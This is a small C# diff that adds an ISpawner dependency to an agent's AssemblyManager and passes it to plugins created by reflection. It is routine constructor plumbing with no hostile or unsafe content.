@@ -15,11 +15,13 @@ namespace Agent.Managers
         private IMessageManager messageManager { get; set; }
         private IAgentConfig agentConfig { get; set; }
         private ITokenManager tokenManager { get; set; }
-        public AssemblyManager(IMessageManager messageManager, ILogger logger, IAgentConfig agentConfig, ITokenManager tokenManager) {
+        private ISpawner spawner { get; set; }
+        public AssemblyManager(IMessageManager messageManager, ILogger logger, IAgentConfig agentConfig, ITokenManager tokenManager, ISpawner spawner) {
             this.logger = logger;
             this.messageManager = messageManager;
             this.agentConfig= agentConfig;
             this.tokenManager = tokenManager;
+            this.spawner = spawner;
         }
         
         private bool TryLoadPlugin(string name, out IPlugin? plugOut)
@@ -130,7 +132,7 @@ namespace Agent.Managers
             {
                 if (typeof(IPlugin).IsAssignableFrom(t))
                 {
-                    IPlugin plug = (IPlugin)Activator.CreateInstance(t, messageManager, agentConfig, logger, tokenManager);
+                    IPlugin plug = (IPlugin)Activator.CreateInstance(t, messageManager, agentConfig, logger, tokenManager, spawner);
                     this.loadedPlugins.GetOrAdd(plug.Name, plug);
 
                     return true;
